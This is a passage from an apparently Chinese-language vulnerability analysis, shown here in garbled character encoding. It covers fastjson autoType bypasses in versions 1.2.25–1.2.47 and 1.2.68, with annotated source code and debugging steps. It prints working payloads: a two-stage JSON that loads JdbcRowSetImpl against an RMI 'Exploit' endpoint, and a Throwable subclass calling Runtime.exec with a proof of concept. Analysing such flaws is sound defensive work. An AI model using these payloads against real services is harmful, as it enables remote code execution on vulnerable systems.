(clazz != null) { if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) { return clazz; } if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver ) { throw new JSONException(\"autoType is not support. \" + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { return clazz; } else { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } } JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor != null \u0026\u0026 autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } } final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features \u0026 mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026 mask) != 0; if (!autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } return clazz; } ç”±ä»¥ä¸Šä»£ç å¯çŸ¥ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªé€»è¾‘é—®é¢˜ï¼šautoTypeSupport ä¸º true æ—¶ï¼Œfastjson ä¼šç¦æ­¢ä¸€äº›é»‘åå•çš„ç±»ååºåˆ—åŒ–ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªåˆ¤æ–­æ¡ä»¶ï¼šå½“ååºåˆ—åŒ–çš„ç±»åœ¨é»‘åå•ä¸­ï¼Œä¸” TypeUtils.mappings ä¸­æ²¡æœ‰è¯¥ç±»çš„ç¼“å­˜æ—¶ï¼Œæ‰ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚è¿™é‡Œå°±ç•™ä¸‹äº†ä¸€ä¸ªä¼ç¬”ã€‚å°±æ˜¯è¿™ä¸ªé€»è¾‘å¯¼è‡´äº† 1.2.32 ä¹‹å‰çš„ç‰ˆæœ¬å°†ä¼šå—åˆ° autoTypeSupport çš„å½±å“ã€‚\nåœ¨ autoTypeSupport ä¸ºé»˜è®¤çš„ false æ—¶ï¼Œç¨‹åºç›´æ¥æ£€æŸ¥é»‘åå•å¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œåœ¨è¿™éƒ¨åˆ†æˆ‘ä»¬æ— æ³•ç»•è¿‡ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å…³æ³¨ç‚¹å°±åœ¨åˆ¤æ–­ä¹‹å‰ï¼Œç¨‹åºæœ‰åœ¨ TypeUtils.mappings ä¸­å’Œ deserializers ä¸­å°è¯•æŸ¥æ‰¾è¦ååºåˆ—åŒ–çš„ç±»ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™å°±ä¼š returnï¼Œè¿™å°±é¿å¼€ä¸‹é¢ autoTypeSupport é»˜è®¤ä¸º false æ—¶çš„æ£€æŸ¥ã€‚å¦‚ä½•æ‰èƒ½åœ¨è¿™ä¸¤æ­¥ä¸­å°†æˆ‘ä»¬çš„æ¶æ„ç±»åŠ è½½è¿›å»å‘¢ï¼Ÿ\nå…ˆçœ‹ deserializers ï¼Œä½äº com.alibaba.fastjson.parser.ParserConfig.deserializers ï¼Œæ˜¯ä¸€ä¸ª IdentityHashMapï¼Œèƒ½å‘å…¶ä¸­èµ‹å€¼çš„å‡½æ•°æœ‰ï¼š\ngetDeserializer()ï¼šè¿™ä¸ªç±»ç”¨æ¥åŠ è½½ä¸€äº›ç‰¹å®šç±»ï¼Œä»¥åŠæœ‰ JSONType æ³¨è§£çš„ç±»ï¼Œåœ¨ put ä¹‹å‰éƒ½æœ‰ç±»ååŠç›¸å…³ä¿¡æ¯çš„åˆ¤æ–­ï¼Œæ— æ³•ä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚ initDeserializers()ï¼šæ— å…¥å‚ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­è°ƒç”¨ï¼Œå†™æ­»ä¸€äº›è®¤ä¸ºæ²¡æœ‰å±å®³çš„å›ºå®šå¸¸ç”¨ç±»ï¼Œæ— æ³•ä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚ putDeserializer()ï¼šè¢«å‰ä¸¤ä¸ªå‡½æ•°è°ƒç”¨ï¼Œæˆ‘ä»¬æ— æ³•æ§åˆ¶å…¥å‚ã€‚ å› æ­¤æˆ‘ä»¬æ— æ³•å‘ deserializers ä¸­å†™å…¥å€¼ï¼Œä¹Ÿå°±åœ¨å…¶ä¸­è¯»å‡ºæˆ‘ä»¬æƒ³è¦çš„æ¶æ„ç±»ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç›®å…‰è½¬å‘äº† TypeUtils.getClassFromMapping(typeName)ã€‚\nåŒæ ·çš„ï¼Œè¿™ä¸ªæ–¹æ³•ä» TypeUtils.mappings ä¸­å–å€¼ï¼Œè¿™æ˜¯ä¸€ä¸ª ConcurrentHashMap å¯¹è±¡ï¼Œèƒ½å‘å…¶ä¸­èµ‹å€¼çš„å‡½æ•°æœ‰ï¼š\naddBaseClassMappings()ï¼šæ— å…¥å‚ï¼ŒåŠ è½½ loadClass()ï¼šå…³é”®å‡½æ•° æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ loadClass() çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 public static Class\u003c?\u003e loadClass(String className, ClassLoader classLoader, boolean cache) { // éç©ºåˆ¤æ–­ if(className == null || className.length() == 0){ return null; } // é˜²æ­¢é‡å¤æ·»åŠ  Class\u003c?\u003e clazz = mappings.get(className); if(clazz != null){ return clazz; } // åˆ¤æ–­ className æ˜¯å¦ä»¥ [ å¼€å¤´ if(className.charAt(0) == '['){ Class\u003c?\u003e componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } // åˆ¤æ–­ className æ˜¯å¦ L å¼€å¤´ ; ç»“å°¾ if(className.startsWith(\"L\") \u0026\u0026 className.endsWith(\";\")){ String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } try{ // å¦‚æœ classLoader éç©ºï¼Œcache ä¸º true åˆ™ä½¿ç”¨è¯¥ç±»åŠ è½½å™¨åŠ è½½å¹¶å­˜å…¥ mappings ä¸­ if(classLoader != null){ clazz = classLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ e.printStackTrace(); // skip } // å¦‚æœå¤±è´¥ï¼Œæˆ–æ²¡æœ‰æŒ‡å®š ClassLoader ï¼Œåˆ™ä½¿ç”¨å½“å‰çº¿ç¨‹çš„ contextClassLoader æ¥åŠ è½½ç±»ï¼Œä¹Ÿéœ€è¦ cache ä¸º true æ‰èƒ½å†™å…¥ mappings ä¸­ try{ ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null \u0026\u0026 contextClassLoader != classLoader){ clazz = contextClassLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ // skip } // å¦‚æœè¿˜æ˜¯å¤±è´¥ï¼Œåˆ™ä½¿ç”¨ Class.forName æ¥è·å– class å¯¹è±¡å¹¶æ”¾å…¥ mappings ä¸­ try{ clazz = Class.forName(className); mappings.put(className, clazz); return clazz; } catch(Throwable e){ // skip } return clazz; } ç”±ä»¥ä¸Šä»£ç å¯çŸ¥ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è¿™ä¸ªæ–¹æ³•çš„å‚æ•°ï¼Œå°±å¯ä»¥å¾€ mappings ä¸­å†™å…¥ä»»æ„ç±»åã€‚ loadClass ä¸€å…±æœ‰ä¸‰ä¸ªé‡è½½æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾ï¼š\næˆ‘ä»¬éœ€è¦æ‰¾åˆ°è°ƒç”¨è¿™äº›æ–¹æ³•çš„ç±»ï¼Œå¹¶çœ‹æ˜¯å¦èƒ½å¤Ÿä¸ºæˆ‘ä»¬æ§åˆ¶ï¼š\nClass\u003c?\u003e loadClass(String className, ClassLoader classLoader, boolean cache)ï¼šè°ƒç”¨é“¾å‡åœ¨ checkAutoType() å’Œ TypeUtils é‡Œè‡ªè°ƒç”¨ï¼Œç•¥è¿‡ã€‚ Class\u003c?\u003e loadClass(String className)ï¼šé™¤äº†è‡ªè°ƒç”¨ï¼Œæœ‰ä¸€ä¸ª castToJavaBean() æ–¹æ³•ï¼Œæš‚æœªç ”ç©¶ã€‚ Class\u003c?\u003e loadClass(String className, ClassLoader classLoader)ï¼šæ–¹æ³•è°ƒç”¨ä¸‰ä¸ªå‚æ•°çš„é‡è½½æ–¹æ³•ï¼Œå¹¶æ·»åŠ å‚æ•° true ï¼Œä¹Ÿå°±æ˜¯ä¼šåŠ å…¥å‚æ•°ç¼“å­˜ä¸­ã€‚ é‡ç‚¹çœ‹ä¸€ä¸‹ä¸¤ä¸ªå‚æ•°çš„ loadClass æ–¹æ³•åœ¨å“ªè°ƒç”¨ï¼š\nåœ¨è¿™é‡Œæˆ‘ä»¬å…³æ³¨ com.alibaba.fastjson.serializer.MiscCodec#deserialze æ–¹æ³•ï¼Œè¿™ä¸ªç±»æ˜¯ç”¨æ¥å¤„ç†ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿç±»çš„ååºåˆ—åŒ–ç±»ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ Class.class ç±»ï¼Œæˆä¸ºäº†æˆ‘ä»¬çš„å…¥å£ã€‚\nå¦‚æœ parser.resolveStatus ä¸ºTypeNameRedirectï¼ˆå€¼ä¸º2ï¼‰ æ—¶ï¼Œè¿›å…¥ if è¯­å¥ï¼Œä¼šè§£æ val ä¸­çš„å†…å®¹å¹¶æ”¾å…¥ objVal ä¸­ï¼Œç„¶åä¼ å…¥ strVal ä¸­ã€‚\nåé¢çš„é€»è¾‘å¦‚æœ class æ˜¯ Class.class æ—¶ï¼Œå°†ä¼šè°ƒç”¨ loadClass æ–¹æ³•ï¼Œå°† strVal è¿›è¡Œç±»åŠ è½½å¹¶ç¼“å­˜ï¼š\nå°ç»“ é¦–å…ˆè¦é¿å¼€checkAutoType()ä¸­autoTypeSupport é»˜è®¤ä¸º false æ—¶çš„æ£€æŸ¥ï¼Œä»ä¸¤ä¸ªifåˆ¤æ–­è¯­å¥å…¥æ‰‹å‘ç°åªæœ‰TypeUtils.getClassFromMapping(typeName)å¯èƒ½å¯¹clazzèµ‹å€¼ä½¿ç”¨ä¸¤ä¸ªå‚æ•°çš„loadclasså‘mappingä¸­èµ‹å€¼MiscCodec#deserialze æ–¹æ³•è°ƒç”¨äº†ä¸¤ä¸ªå‚æ•°çš„loadclass.è°ƒç”¨ä¹‹å‰éœ€è¦æ»¡è¶³parser.resolveStatus ä¸ºTypeNameRedirectï¼ˆå€¼ä¸º2ï¼‰ æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªkeyä¸º val ï¼Œæ­¤æ—¶ä¼šå°†valçš„å†…å®¹æ”¾å…¥ objVal ä¸­ï¼Œç„¶åä¼ å…¥ strVal ä¸­ã€‚ æ¥ç€å¦‚æœ class æ˜¯ Class.class æ—¶ï¼Œå°†ä¼šè°ƒç”¨ loadClass æ–¹æ³•ï¼Œå°† strVal è¿›è¡Œç±»åŠ è½½å¹¶ç¼“å­˜ã€‚\næ‰€ä»¥å¯ä»¥å°†æ¶æ„ç±»åå­˜åˆ°valä¸­ï¼Œè¿™å°±å®Œæˆäº†æ¶æ„ç±»çš„åŠ è½½ï¼Œå¯ä»¥é¿å¼€å¼‚å¸¸çš„æŠ›å‡ºã€‚ å¦‚ä½•æ»¡è¶³parser.resolveStatus ä¸ºTypeNameRedirectï¼ˆå€¼ä¸º2ï¼‰ï¼Œåœ¨åé¢è°ƒè¯•ä¸­ä¼šè®²åˆ°\nè°ƒè¯• æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ª json ï¼š{\"@type\":\"java.lang.Class\",\"val\":\"reus09\"} ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼š\nJSON.parseObject() è°ƒç”¨ DefaultJSONParser å¯¹ JSON è¿›è¡Œè§£æã€‚\nDefaultJSONParser.parseObject() è°ƒç”¨ checkAutoType() æ£€æŸ¥å¾…åŠ è½½ç±»çš„åˆæ³•æ€§ã€‚\nç”±äº deserializers åœ¨åˆå§‹åŒ–æ—¶å°† Class.class è¿›è¡Œäº†åŠ è½½ï¼Œå› æ­¤ä½¿ç”¨ findClass å¯ä»¥æ‰¾åˆ°ï¼Œè¶Šè¿‡äº†åé¢ AutoTypeSupport çš„æ£€æŸ¥ã€‚\nDefaultJSONParser.parseObject() è®¾ç½® resolveStatus ä¸º 2ã€‚ DefaultJSONParser.parseObject() æ ¹æ®ä¸åŒçš„ class ç±»å‹åˆ†é… deserialzerï¼ŒClass ç±»å‹ç”± MiscCodec.deserialze() å¤„ç†ã€‚\nè§£æ json ä¸­ â€œvalâ€ ä¸­çš„å†…å®¹ï¼Œå¹¶æ”¾å…¥ objVal ä¸­ï¼Œå¦‚æœä¸æ˜¯ â€œvalâ€ å°†ä¼šæŠ¥é”™ã€‚\nä¼ é€’è‡³ strVal å¹¶ä½¿ç”¨ loadClass åŠ è½½å¹¶ç¼“å­˜ã€‚\næ­¤æ—¶æ¶æ„çš„ val æˆåŠŸè¢«æˆ‘ä»¬åŠ è½½åˆ° mappings ä¸­ï¼Œå†æ¬¡ä»¥æ¶æ„ç±»è¿›è¡Œ @type è¯·æ±‚æ—¶å³å¯ç»•è¿‡é»‘åå•è¿›è¡Œçš„é˜»æ‹¦ï¼Œå› æ­¤æœ€ç»ˆ payload ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 { \"reus09\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"reus09\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\": true } } å½±å“ç‰ˆæœ¬åˆ†æ å½±å“ç‰ˆæœ¬ï¼š1.2.25 \u003c= fastjson \u003c= 1.2.32 æœªå¼€å¯ AutoTypeSupportï¼Œæ‰å¯ä»¥è¢«åˆ©ç”¨ å½±å“ç‰ˆæœ¬ï¼š1.2.33 \u003c= fastjson \u003c= 1.2.47ä¸è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½å¯ä»¥è¢«åˆ©ç”¨ã€‚\nä¸¤è€…åœ¨checkAutoTypeå®ç°çš„é€»è¾‘å…¶å®å·®ä¸å¤šï¼Œå…¶å®å°±æ˜¯åè€…å¯¹é»‘åå•è¯†åˆ«å‘½ä¸­æŠ¥é”™çš„æ—¶å€™ï¼Œé¢å¤–åŠ äº†æ¡ä»¶ï¼Œè¯¥ç±»æ— æ³•ä»ç¼“å­˜mappingsä¸­æ‰¾åˆ°æ‰ä¼šæŠ¥é”™ã€‚\nä¸¤è€…å®ç°åŸç†æœ¬è´¨ä¸Šéƒ½æ˜¯ä»£ç æ‰§è¡Œé¡ºåºçš„ç»•è¿‡ã€‚\n1.2.25 \u003c= fastjson \u003c= 1.2.32 autoTypeSupportä¸ºtrue åœ¨è¯¥ç‰ˆæœ¬ä¸­çš„checkAutoTypeæ–¹æ³•ä¸­ï¼Œå¦‚æœè¯†åˆ«åˆ°é»‘åå•é‡Œé¢çš„ç±»ç›´æ¥æŠ¥é”™autoType is not support.\nåœ¨åé»‘å•è¯†åˆ«åæ‰§è¡Œæ‰æ‰§è¡ŒgetClassFromMappingæ–¹æ³•å’ŒfindClassæ–¹æ³•ã€‚\nåœ¨è§£ææˆ‘ä»¬çš„ç¬¬ä¸€æ®µpayloadçš„æ—¶å€™\n1 2 3 4 reus09\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, å› ä¸º@typeæŒ‡å®šçš„ç±»java.lang.Classä¸å±äºé»‘åå•ï¼Œå¹¶ä¸”å¯ä»¥åœ¨clazz = this.deserializers.findClass(typeName);è·å¾—å¯¹åº”çš„ååºåˆ—åŒ–MiscCodecï¼Œåœ¨å®ƒçš„deserialzeæ–¹æ³•ä¸­å®ç°äº†TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())æ–¹æ³•ï¼Œå°†å¯¹åº”çš„valçš„å€¼åŠ å…¥åˆ°mappingsé‡Œé¢ã€‚\nä½†æ˜¯åœ¨è§£æç¬¬äºŒæ®µpayload çš„æ—¶å€™\n1 2 3 4 5 \"reus09\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\": true } com.sun.rowset.JdbcRowSetImplçš„classNameè¿˜æ¥å¾—åŠè¿›è¡Œmappingsçš„åˆ¤æ–­ï¼Œå°±è¢«é»‘åå•å¹²æ‰äº†ï¼ŒæŠ¥é”™äº†ã€‚\nå› æ­¤autoTypeSupportå¼€å¯çš„æ—¶å€™ï¼Œï¼Œpayloadä¸èµ·æ•ˆæœ\nautoTypeSupportä¸ºfalse å¦‚ä¸Šé¢çš„åˆ†æä¸€æ ·ï¼Œå¦‚æœautoTypeSupportä¸ºfalseï¼Œé‚£ä¹ˆåœ¨è¿›è¡Œif(!autoTypeSupport)å‰ï¼Œå³æ‰§è¡Œé»‘ç™½åå•åˆ¤æ–­å‰ï¼Œå°±ä¼šå…ˆæ‰§è¡ŒgetClassFromMappingæ–¹æ³•å’ŒfindClassæ–¹æ³•ã€‚\né‚£ä¹ˆåœ¨è§£æç¬¬ä¸€æ®µpayloadçš„æ—¶å€™ï¼Œç›´æ¥å°±å¯ä»¥é€šè¿‡clazz = this.deserializers.findClass(typeName);è·å¾—ååºåˆ—åŒ–å™¨MiscCodecï¼Œå¹¶å°†clazzèµ‹ä¸ºjava.lang.classï¼Œç„¶åç¨‹åºå› ä¸ºclazzä¸ä¸ºç©ºï¼Œç›´æ¥è¿”å›clazzï¼Œè¿™æ ·å°±è·³è¿‡äº†é»‘ç™½åå•çš„å®¡æŸ¥ã€‚ç„¶ååç»­MiscCodecçš„deserialzeæ–¹æ³•å°†valå¯¹åº”çš„å€¼com.sun.rowset.JdbcRowSetImplåŠ å…¥åˆ°mappingsä¸­ã€‚\nç„¶ååœ¨è§£æç¬¬äºŒæ®µpayloadçš„æ—¶å€™ï¼ŒTypeUtils.getClassFromMapping(typeName)ç›´æ¥ä»mappingsä¸­è·å–ç¼“å­˜çš„ç±»åï¼Œç„¶åç›´æ¥è¿”å›ã€‚\nä¹‹åçš„ååºåˆ—åŒ–å°±ä¸å†è®²äº†ã€‚\n1.2.33 \u003c= fastjson \u003c= 1.2.47 1.2.33~1.2.47ä¹‹é—´çš„checkAutoTypeæ–¹æ³•å’Œä¹‹å‰çš„æœ‰æ‰€æ”¹åŠ¨ï¼Œåªæœ‰è¯†åˆ«åˆ°ç±»åœ¨é»‘åå•ä¸­å¹¶ä¸”åŒæ—¶æ— æ³•ä»mappingsä¸­è·å–ï¼Œæ‰ä¼šæŠ¥é”™autoType is not supportã€‚\nautoTypeSupportä¸ºtrue ç¬¬ä¸€æ®µpayloadç›´æ¥é€šè¿‡clazz = this.deserializers.findClass(typeName);ï¼Œæ‰¾åˆ°ååºåˆ—åŒ–å™¨MiscCodecï¼Œç„¶åé€šè¿‡å®ƒçš„deserizeæ–¹æ³•å®ç°å°†valçš„å€¼com.sun.rowset.JdbcRowSetImplæ·»åŠ åˆ°mappingsä¸­ã€‚\nç¬¬äºŒæ®µpayloadå› ä¸ºcom.sun.rowset.JdbcRowSetImplåœ¨mappingsä¸­å­˜å‚¨ç€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿‡é»‘åå•çš„æŠ¥é”™ï¼Œç„¶åé€šè¿‡clazz = TypeUtils.getClassFromMapping(typeName)è·å¾—å¯¹åº”çš„clazzï¼Œæœ€åæ‰§è¡Œå®ƒçš„ååºåˆ—åŒ–ã€‚\nautoTypeSupportä¸ºfalse åˆ©ç”¨é“¾å’ŒautoTypeSupportä¸ºtrueçš„æƒ…å†µä¸€æ ·ã€‚\nå®é™…ä¸Šï¼Œè¿™ä¸ªç‰ˆæœ¬çš„fastJsonå®ç°çš„æ˜¯å¯¹é»‘åå•æŠ¥é”™é¢å¤–åŠ æ¡ä»¶(ç¼“å­˜mappingsä¸­æ²¡æœ‰è¯¥ç±»)å¯¼è‡´çš„ã€‚\nfastjson-1.2.68 åœ¨ 1.2.47 ç‰ˆæœ¬æ¼æ´çˆ†å‘ä¹‹åï¼Œå®˜æ–¹åœ¨ 1.2.48 å¯¹æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œåœ¨ MiscCodec å¤„ç† Class ç±»çš„åœ°æ–¹ï¼Œè®¾ç½®äº†cache ä¸º false ï¼Œå¹¶ä¸” loadClass é‡è½½æ–¹æ³•çš„é»˜è®¤çš„è°ƒç”¨æ”¹ä¸ºä¸ç¼“å­˜ï¼Œè¿™å°±é¿å…äº†ä½¿ç”¨äº† Class æå‰å°†æ¶æ„ç±»åç¼“å­˜è¿›å»ã€‚\nMisCodecçš„deserialzeæ–¹æ³•ä¸­è°ƒç”¨TypeUtils.loadClassæ–¹æ³•ã€‚\nloadClassé»˜è®¤çš„cacheä¹Ÿè®¾ç½®ä¸ºfalse\nè¿™ä¸ªå®‰å…¨ä¿®å¤ä¸º fastjson å¸¦æ¥äº†ä¸€å®šæ—¶é—´çš„å¹³é™ï¼Œç›´åˆ° 1.2.68 ç‰ˆæœ¬å‡ºç°äº†æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚\nå½±å“ç‰ˆæœ¬ï¼šfastjson \u003c= 1.2.68 æè¿°ï¼šåˆ©ç”¨ expectClass ç»•è¿‡ checkAutoType() ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ä¸ºäº†ç»•è¿‡å®‰å…¨æ£€æŸ¥çš„æ€è·¯çš„å»¶ä¼¸ã€‚ä¸»è¦ä½¿ç”¨ Throwable å’Œ AutoCloseable è¿›è¡Œç»•è¿‡ã€‚\nç‰ˆæœ¬ 1.2.68 æœ¬èº«æ›´æ–°äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æ§åˆ¶ç‚¹ safeModeï¼Œå¦‚æœåº”ç”¨ç¨‹åºå¼€å¯äº† safeModeï¼Œå°†åœ¨ checkAutoType() ä¸­ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯å®Œå…¨ç¦æ­¢ autoTypeï¼Œä¸å¾—ä¸è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸€åŠ³æ°¸é€¸çš„ä¿®å¤æ–¹å¼ã€‚\nä½†ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸ªç‰ˆæœ¬æŠ¥å‡ºäº†ä¸€ä¸ªæ–°çš„ autoType å¼€å…³ç»•è¿‡æ–¹å¼ï¼šåˆ©ç”¨ expectClass ç»•è¿‡ checkAutoType()ã€‚\nåœ¨ checkAutoType() å‡½æ•°ä¸­æœ‰è¿™æ ·çš„é€»è¾‘ï¼šå¦‚æœå‡½æ•°æœ‰ expectClass å…¥å‚ï¼Œä¸”æˆ‘ä»¬ä¼ å…¥çš„ç±»åæ˜¯ expectClass çš„å­ç±»æˆ–å®ç°ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼Œå°±å¯ä»¥é€šè¿‡ checkAutoType() çš„å®‰å…¨æ£€æµ‹ã€‚(isAssignableFrom(clazz) åˆ¤å®šæ­¤ Class å¯¹è±¡æ‰€è¡¨ç¤ºçš„ç±»æˆ–æ¥å£ä¸æŒ‡å®šçš„ Class å‚æ•°æ‰€è¡¨ç¤ºçš„ç±»æˆ–æ¥å£æ˜¯å¦ç›¸åŒï¼Œæˆ–æ˜¯å¦æ˜¯å…¶è¶…ç±»æˆ–è¶…æ¥å£)ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾ä¸€ä¸‹ checkAutoType() å‡ ä¸ªé‡è½½æ–¹æ³•æ˜¯å¦æœ‰å¯æ§çš„ expectClass çš„å…¥å‚æ–¹å¼ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†ä»¥ä¸‹å‡ ä¸ªç±»ï¼š\nThrowableDeserializer#deserialze() JavaBeanDeserializer#deserialze() ThrowableDeserializeråˆ©ç”¨ å¦‚æœä¼ å…¥çš„æ˜¯java.lang.Throwableç±»ï¼Œé‚£ä¹ˆå…¶å¯¹åº”çš„ååºåˆ—åŒ–è§£æå™¨ä¸ºThrowableDeserializerã€‚\nThrowableDeserializer#deserialze() æ–¹æ³•ç›´æ¥å°† @type åçš„ç±»ä¼ å…¥ checkAutoType() ï¼Œå¹¶ä¸” expectClass ä¸º Throwable.classã€‚\né€šè¿‡ checkAutoType() ä¹‹åï¼Œå°†ä½¿ç”¨ createException æ¥åˆ›å»ºå¼‚å¸¸ç±»çš„å®ä¾‹ã€‚\nè¿™å°±å½¢æˆäº† Throwable å­ç±»ç»•è¿‡ checkAutoType() çš„æ–¹å¼ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ° Throwable çš„å­ç±»ï¼Œè¿™ä¸ªç±»çš„ getter/setter/static block/constructor ä¸­å«æœ‰å…·æœ‰å¨èƒçš„ä»£ç é€»è¾‘ã€‚\nå› ä¸ºThrowableç±»æ—¢æ²¡æœ‰åœ¨é»‘ç™½åå•é‡Œé¢ï¼Œä¹Ÿä¸åœ¨ç¼“å­˜é‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥æŒ‡å®šExpectClasä¸ºThrowable\njava.lang.Exceptionç»§æ‰¿äº†Throwableç±»ï¼Œå¹¶ä¸”ä¹Ÿåœ¨mappingsä¸­çš„ç¼“å­˜ã€‚\nè¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰å®ç°äº†ä¸€ä¸ªç»§æ‰¿äº†Throwableç±»çš„å­ç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package com.reus09.Evil; import java.io.IOException; /** * @ClassName ExecException * @Description TODO * @Author reus09 * @Date 2023/4/20 01:08 * @Version 1.0 **/ public class ExecThrowable extends Throwable{ private String domain; public(String domain){ try { Runtime.getRuntime().exec(domain); } catch (IOException e) { e.printStackTrace(); } } public String getDomain() { return domain; } public void setDomain(String domain) { this.domain = domain; } @Override public String getMessage() { return super.getMessage(); } } æˆ‘ä»¬çš„Pocå¦‚ä¸‹ï¼š\n1 2 3 4 5 { \"@type\":\"java.lang.Exception\", \"@type\": \"com.reus09.Evil.ExecThrowable\", \"domain\": \"open /System/Applications/Calculator.app\" } è°ƒè¯• ç¬¬ä¸€æ¬¡æ˜¯ä¼ å…¥java.lang.Exceptionç±»è¿›è¡Œæ ¡éªŒï¼Œè¿™é‡ŒCheckAutoType()å‡½æ•°çš„expectClasså‚æ•°æ˜¯ä¸ºnullçš„ï¼š\næ¥ç€ç›´æ¥ä»ç¼“å†²mappingsä¸­è·å–åˆ°äº†java.lang.Exceptionç±»\nç„¶ååˆ¤æ–­clazzæ˜¯å¦ ä¸æ˜¯expectClassç±»çš„ç»§æ‰¿ç±»ä¸”ä¸æ˜¯HashMapç±»å‹ï¼Œæ˜¯çš„è¯æŠ›å‡ºå¼‚å¸¸ï¼Œå¦åˆ™ç›´æ¥è¿”å›è¯¥ç±»ã€‚è¿™é‡Œæ²¡æœ‰expectClasså°±ç›´æ¥è¿”å›java.lang.Exceptionç±»ï¼š\nç„¶åå›åˆ°com.alibaba.fastjson.parser.DefaultJSONParser#parseObjectæ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬çš„java.lang.Exceptionå®é™…ä¸Šæ˜¯Throwableç±»çš„å­ç±»ï¼Œæ‰€ä»¥å®ƒçš„ååºåˆ—åŒ–å™¨ä¸ºThrowableDeserializerã€‚ç„¶åè°ƒç”¨ThrowableDeserializerçš„deserializeæ–¹æ³•ã€‚\nåœ¨com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialzeçš„æ–¹æ³•é‡Œé¢ï¼ŒexClassNameè·å–POCä¸­ä¸‹ä¸€ä¸ª@typeæŒ‡å®šçš„ClassNameï¼Œç„¶åå†æ¬¡è°ƒç”¨checkAutoTypeå‡½æ•°ï¼Œå¹¶ä¸”ä¼ å…¥çš„expectClassä¸ºThrowableã€‚ com.reus09.Evil.ExecThrowableè¿™ä¸ªç±»æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ï¼Œä¸æ˜¯é»‘ã€ç™½åå•ä¸Šé¢çš„ç±»ï¼Œä¹Ÿä¸å­˜åœ¨ç¼“å­˜mappingsä¸­ï¼Œå¹¶ä¸”å› ä¸ºä¼ å…¥çš„expectClassæ˜¯Throwableç±»ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰ç±»æ˜¯Throwableçš„å­ç±»ï¼Œå› æ­¤expectClassFlagä¸ºtrueã€‚\næ¥ç€ä¼šç»•è¿‡é»‘ç™½åå•çš„æ£€æµ‹ï¼Œç»è¿‡autoTypeSupportä¸ºtrueæˆ–falseçš„ä¸¤ç§æƒ…å†µçš„æ£€æŸ¥ï¼Œç”±äºexpectClassFlagä¸ºtrueï¼Œè¿›å…¥å¦‚ä¸‹çš„loadClass()é€»è¾‘æ¥åŠ è½½ç›®æ ‡ç±»ï¼Œç”±äºAutoTypeå…³é—­ä¸”jsonTypeä¸ºfalseï¼Œå› 